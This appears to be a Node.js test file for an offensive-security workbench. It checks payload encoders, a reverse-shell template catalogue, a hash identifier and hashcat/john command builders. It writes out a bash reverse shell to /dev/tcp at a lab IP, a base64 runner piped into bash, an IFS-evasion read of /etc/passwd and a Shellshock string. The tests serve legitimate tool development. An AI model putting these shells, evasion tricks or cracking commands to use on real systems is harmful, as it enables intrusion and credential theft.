/* Workbench engine (OBOL.workbench): encoders and the reverse-shell catalogue. Locks the byte-exact
 * base64 (round-trips), the PowerShell -EncodedCommand (UTF-16LE then base64), template filling, and
 * that every catalogue entry is well formed. Pure, generic data. */
'use strict';
require('../../assets/engine/workbench.js');
const OBOL = globalThis.OBOL, W = OBOL.workbench;

let fail = 0;
function ok(cond, msg) { if (!cond) { console.error('  FAIL:', msg); fail++; } else { console.log('  ok  :', msg); } }

// base64 against node's own Buffer (ground truth)
['', 'a', 'ab', 'abc', 'hello world', 'id;whoami', '() { :;}; echo vulnerable', 'café ☕'].forEach(function (s) {
  ok(W.b64(s) === Buffer.from(s, 'utf8').toString('base64'), 'b64 matches node Buffer for ' + JSON.stringify(s));
});
// base64 round-trips through our own decoder
['', 'abc', 'hello world', 'café ☕', 'id;whoami'].forEach(function (s) {
  ok(W.b64decode(W.b64(s)) === s, 'b64 round-trips ' + JSON.stringify(s));
});

// PowerShell -EncodedCommand: base64 of UTF-16LE bytes, byte-identical to node's own encoding
const ps = 'whoami';
ok(W.psEnc(ps) === Buffer.from(ps, 'utf16le').toString('base64'), 'psEnc matches node utf16le base64');
ok(W.psEnc(ps) === 'dwBoAG8AYQBtAGkA', 'psEnc(whoami) is the known value');

// other encoders
ok(W.hexEnc('AB') === '4142', 'hexEnc AB -> 4142');
ok(W.rot13('abcABC') === 'nopNOP', 'rot13 basic');
ok(W.rot13(W.rot13('Hello, World!')) === 'Hello, World!', 'rot13 is its own inverse');
ok(W.urlEncAll('a b') === '%61%20%62', 'urlEncAll encodes every byte');
ok(W.ifsEvade('cat /etc/passwd') === 'cat${IFS}/etc/passwd', 'ifsEvade swaps spaces');

// template filling
const bash = W.revShell('bash-i');
ok(bash && /bash -i/.test(bash.tpl), 'bash-i entry exists');
ok(W.fill(bash.tpl, { lhost: '10.10.14.2', lport: '4444' }) === 'bash -i >& /dev/tcp/10.10.14.2/4444 0>&1', 'fill substitutes lhost/lport');
ok(W.fill(bash.tpl, { lhost: '10.10.14.2' }).indexOf('{{lport}}') >= 0, 'missing value stays a visible token');

// linux base64 runner wraps and decodes back to the original
const cmd = W.fill(bash.tpl, { lhost: '10.0.0.1', lport: '9001' });
const runner = W.linuxB64Runner(cmd);
ok(/\| base64 -d \| bash$/.test(runner), 'linuxB64Runner pipes to base64 -d | bash');
ok(W.b64decode(runner.split(' ')[1]) === cmd, 'the runner payload decodes back to the command');

// catalogue integrity
ok(W.REVSHELLS.length >= 12, 'catalogue has the common set (' + W.REVSHELLS.length + ')');
const ids = {};
W.REVSHELLS.forEach(function (e) {
  ok(e.id && e.name && e.tpl && e.note, 'entry ' + e.id + ' is well formed');
  ok(!ids[e.id], 'id ' + e.id + ' is unique'); ids[e.id] = 1;
  ok(['linux', 'windows'].indexOf(e.os) >= 0, 'entry ' + e.id + ' has a known os');
});
ok(W.revShell('ps-tcp').enc.indexOf('psenc') >= 0, 'the PowerShell TCP shell offers -EncodedCommand');

// ── hash identifier ──────────────────────────────────────────────────────────────────────────
function topName(h) { return (W.identifyHash(h).candidates[0] || {}).name || ''; }
function topMode(h) { return (W.identifyHash(h).candidates[0] || {}).mode; }

ok(/bcrypt/.test(topName('$2b$12$' + 'a'.repeat(53))), 'bcrypt recognised by prefix');
ok(topMode('$2b$12$' + 'a'.repeat(53)) === 3200, 'bcrypt is mode 3200');
ok(/sha512crypt/.test(topName('$6$abc$def')), 'sha512crypt ($6$) recognised');
ok(topMode('$6$abc$def') === 1800, 'sha512crypt is mode 1800');
ok(/md5crypt/.test(topName('$1$abc$def')), 'md5crypt ($1$) recognised');
ok(/phpass/i.test(topName('$P$Babcdefghijklmnop')), 'phpass ($P$) recognised');
ok(topMode('$krb5tgs$23$*svc*' ) === 13100, 'Kerberoast RC4 is mode 13100');
ok(topMode('$krb5asrep$23$user@DOM') === 18200, 'AS-REP RC4 is mode 18200');
ok(topMode('$krb5tgs$18$*svc*') === 19700, 'Kerberoast AES256 is mode 19700');

// bare hex: NTLM/MD5 ambiguity for 32 hex, NTLM ranked first with MD5 offered
const h32 = W.identifyHash('b4b9b02e6f09a9bd760f388b67351e2b');
ok(h32.candidates.length >= 2 && /NTLM/.test(h32.candidates[0].name), '32-hex ranks NTLM first');
ok(h32.candidates.some(function (c) { return /MD5/.test(c.name) && c.mode === 0; }), '32-hex also offers MD5 (mode 0)');
ok(topMode('a'.repeat(40)) === 100, '40-hex is SHA-1 (mode 100)');
ok(topMode('a'.repeat(64)) === 1400, '64-hex is SHA-256 (mode 1400)');
ok(topMode('a'.repeat(128)) === 1700, '128-hex is SHA-512 (mode 1700)');

// NetNTLMv2 capture
ok(topMode('user::DOMAIN:1122334455667788:' + 'a'.repeat(32) + ':' + 'b'.repeat(40)) === 5600, 'NetNTLMv2 capture is mode 5600');

// pwdump line: identify the NT hash, flag the LM only when set
const pw = W.identifyHash('Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::');
ok(/NTLM/.test(pw.candidates[0].name) && pw.candidates.length === 1, 'pwdump with empty LM yields NT only');
const pw2 = W.identifyHash('bob:1001:' + 'a'.repeat(32) + ':' + 'b'.repeat(32) + ':::');
ok(pw2.candidates.some(function (c) { return /^LM/.test(c.name); }), 'pwdump with a set LM flags the LM too');

// crack command builders
ok(W.hashcatCmd(1000) === 'hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt', 'hashcat command forms');
ok(W.hashcatCmd(null) === null, 'no hashcat command for a null mode');
ok(/john --format=nt /.test(W.johnCmd('nt')), 'john command forms');

// unknown input is handled gracefully
ok(W.identifyHash('not a hash at all').candidates.length === 0, 'non-hash yields no candidates (with a note)');
ok(W.identifyHash('').candidates.length === 0, 'empty input is safe');

console.log(fail ? ('\nWORKBENCH: ' + fail + ' FAILURES') : '\nWORKBENCH: all passed');
process.exit(fail ? 1 : 0);
